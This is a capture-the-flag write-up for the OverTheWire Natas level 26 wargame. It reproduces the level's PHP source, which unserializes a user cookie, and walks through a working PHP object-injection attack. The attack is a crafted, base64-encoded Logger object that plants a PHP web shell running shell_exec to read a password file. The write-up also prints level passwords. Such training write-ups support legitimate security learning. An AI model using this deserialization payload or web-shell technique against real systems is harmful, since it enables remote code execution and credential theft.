# Natas Level 25 → Level 26 PHP Deserialization Vulnerability

## Previous Flag
<b>cVXXwxMS3Y26n5UZU89QgpGmWCelaQlE</b>

## Goal
Username: natas26<br>
URL: http://natas26.natas.labs.overthewire.org<br>

![alt text](/static/natas26.png "natas26 Input")
 
| Feature / Function             | `serialize()` / `unserialize()` | `json_encode()` / `json_decode()` | `JSON.stringify()` / `JSON.parse()` |
|-------------------------------|----------------------------------|-----------------------------------|--------------------------------------|
| Language(s)                   | PHP                              | PHP                               | JavaScript                           |
| Format                        | PHP-specific binary/text         | JSON (text-based)                 | JSON (text-based)                    |
| Cross-language compatible?    | No                               | Yes                               | Yes                                  |
| Preserves object types?       | Yes (includes class name)        | No (converts to stdClass/array)   | No (converts to plain object)        |
| Preserves methods?            | Yes (with class definition)      | No                                | No                                   |
| Readable?                     | No                               | Yes                               | Yes                                  |
| Use case                      | PHP-only persistence             | API communication, config, logs   | API communication, config, storage   |
| Security risks                | High (object injection possible) | Safer (no code execution)         | Safer (no code execution)            |

## What I learned
```
PHP magic methods similar to Python dunder method and C++ function override
string deserialized back into an object

Look for unserialize() calls and perform an object deserialization attack
```

## Solution
```
View source code
http://natas26.natas.labs.overthewire.org/index-source.html

<html>
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src="http://natas.labs.overthewire.org/js/wechall-data.js"></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas26", "pass": "<censored>" };</script></head>
<body>
<?php
    class Logger{
        private $logFile;
        private $initMsg;
        private $exitMsg;

        function __construct($file){
            // initialise variables
            $this->initMsg="#--session started--#\n";
            $this->exitMsg="#--session end--#\n";
            $this->logFile = "/tmp/natas26_" . $file . ".log";

            // write initial message
            $fd=fopen($this->logFile,"a+");
            fwrite($fd,$this->initMsg);
            fclose($fd);
        }

        function log($msg){
            $fd=fopen($this->logFile,"a+");
            fwrite($fd,$msg."\n");
            fclose($fd);
        }

        function __destruct(){
            // write exit message
            $fd=fopen($this->logFile,"a+");
            fwrite($fd,$this->exitMsg);
            fclose($fd);
        }
    }

    function showImage($filename){
        if(file_exists($filename))
            echo "<img src=\"$filename\">";
    }

    function drawImage($filename){
        $img=imagecreatetruecolor(400,300);
        drawFromUserdata($img);
        imagepng($img,$filename);
        imagedestroy($img);
    }

    function drawFromUserdata($img){
        if( array_key_exists("x1", $_GET) && array_key_exists("y1", $_GET) &&
            array_key_exists("x2", $_GET) && array_key_exists("y2", $_GET)){

            $color=imagecolorallocate($img,0xff,0x12,0x1c);
            imageline($img,$_GET["x1"], $_GET["y1"],
                            $_GET["x2"], $_GET["y2"], $color);
        }

        if (array_key_exists("drawing", $_COOKIE)){
            $drawing=unserialize(base64_decode($_COOKIE["drawing"])); 👀
            if($drawing)
                foreach($drawing as $object)
                    if( array_key_exists("x1", $object) &&
                        array_key_exists("y1", $object) &&
                        array_key_exists("x2", $object) &&
                        array_key_exists("y2", $object)){

                        $color=imagecolorallocate($img,0xff,0x12,0x1c);
                        imageline($img,$object["x1"],$object["y1"],
                                $object["x2"] ,$object["y2"] ,$color);
                    }
        }
    }

    function storeData(){
        $new_object=array();

        if(array_key_exists("x1", $_GET) && array_key_exists("y1", $_GET) &&
            array_key_exists("x2", $_GET) && array_key_exists("y2", $_GET)){
            $new_object["x1"]=$_GET["x1"];
            $new_object["y1"]=$_GET["y1"];
            $new_object["x2"]=$_GET["x2"];
            $new_object["y2"]=$_GET["y2"];
        }

        if (array_key_exists("drawing", $_COOKIE)){
            $drawing=unserialize(base64_decode($_COOKIE["drawing"]));
        }
        else{
            // create new array
            $drawing=array();
        }

        $drawing[]=$new_object;
        setcookie("drawing",base64_encode(serialize($drawing)));
    }
?>

<h1>natas26</h1>
<div id="content">

Draw a line:<br>
<form name="input" method="get">
X1<input type="text" name="x1" size=2>
Y1<input type="text" name="y1" size=2>
X2<input type="text" name="x2" size=2>
Y2<input type="text" name="y2" size=2>
<input type="submit" value="DRAW!">
</form>

<?php
    session_start();

    if (array_key_exists("drawing", $_COOKIE) ||
        (   array_key_exists("x1", $_GET) && array_key_exists("y1", $_GET) &&
            array_key_exists("x2", $_GET) && array_key_exists("y2", $_GET))){
        $imgfile="img/natas26_" . session_id() .".png";
        drawImage($imgfile);
        showImage($imgfile);
        storeData();
    }
?>

<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
</body>
</html>

# Obtain base64-encoded string
@trungdullc ➜ /workspaces/01noobHacker (main) $ php -d xdebug.mode=off scripts/natas26.php ⌨️
Tzo2OiJMb2dnZXIiOjI6e3M6MTU6IgBMb2dnZXIAbG9nRmlsZSI7czo2NToiL3Zhci93d3cvbmF0YXMvbmF0YXMyNi9pbWcvbmF0YXMyNl9ianBqaWN0ZTYxcWRodnZtcGZyM3RhZGMwby5waHAiO3M6MTU6IgBMb2dnZXIAZXhpdE1zZyI7czo1OToiPD9waHAgZWNobyBzaGVsbF9leGVjKCdjYXQgL2V0Yy9uYXRhc193ZWJwYXNzL25hdGFzMjcnKTsgPz4iO30=
# non-base64 encoded, Serialized Form
@trungdullc ➜ /workspaces/01noobHacker (main) $ echo -n ⌨️ "Tzo2OiJMb2dnZXIiOjI6e3M6MTU6IgBMb2dnZXIAbG9nRmlsZSI7czo2NToiL3Zhci93d3cvbmF0YXMvbmF0YXMyNi9pbWcvbmF0YXMyNl9ianBqaWN0ZTYxcWRodnZtcGZyM3RhZGMwby5waHAiO3M6MTU6IgBMb2dnZXIAZXhpdE1zZyI7czo1OToiPD9waHAgZWNobyBzaGVsbF9leGVjKCdjYXQgL2V0Yy9uYXRhc193ZWJwYXNzL25hdGFzMjcnKTsgPz4iO30=" | base64 -d
O:6:"Logger":2:{s:15:"LoggerlogFile";s:65:"/var/www/natas/natas26/img/natas26_bjpjicte61qdhvvmpfr3tadc0o.php"👀;s:15:"LoggerexitMsg";s:59:"<?php echo shell_exec('cat /etc/natas_webpass/natas27'); ?>";}

# In Browser replace drawing value
F12 → Application
Storage → Cookies

Name            Value
drawing       <replace_with_base64_below>
  Tzo2OiJMb2dnZXIiOjI6e3M6MTU6IgBMb2dnZXIAbG9nRmlsZSI7czo2NToiL3Zhci93d3cvbmF0YXMvbmF0YXMyNi9pbWcvbmF0YXMyNl9ianBqaWN0ZTYxcWRodnZtcGZyM3RhZGMwby5waHAiO3M6MTU6IgBMb2dnZXIAZXhpdE1zZyI7czo1OToiPD9waHAgZWNobyBzaGVsbF9leGVjKCdjYXQgL2V0Yy9uYXRhc193ZWJwYXNzL25hdGFzMjcnKTsgPz4iO30=

F5 (Refresh)
Fatal error: Uncaught Error: Cannot use object of type Logger as array in /var/www/natas/natas26/index.php:105 Stack trace: #0 /var/www/natas/natas26/index.php(131): storeData() #1 {main} thrown in /var/www/natas/natas26/index.php on line 105

Browser: http://natas26.natas.labs.overthewire.org/img/natas26_bjpjicte61qdhvvmpfr3tadc0o.php ⌨️
u3RRffXjysjgwFU6b9xa23i6prmUsYne u3RRffXjysjgwFU6b9xa23i6prmUsYne u3RRffXjysjgwFU6b9xa23i6prmUsYne u3RRffXjysjgwFU6b9xa23i6prmUsYne u3RRffXjysjgwFU6b9xa23i6prmUsYne u3RRffXjysjgwFU6b9xa23i6prmUsYne u3RRffXjysjgwFU6b9xa23i6prmUsYne u3RRffXjysjgwFU6b9xa23i6prmUsYne 🔐
```

## Flag
<b>u3RRffXjysjgwFU6b9xa23i6prmUsYne</b>

## Continue
[Continue](/overthewire/Natas2627.md)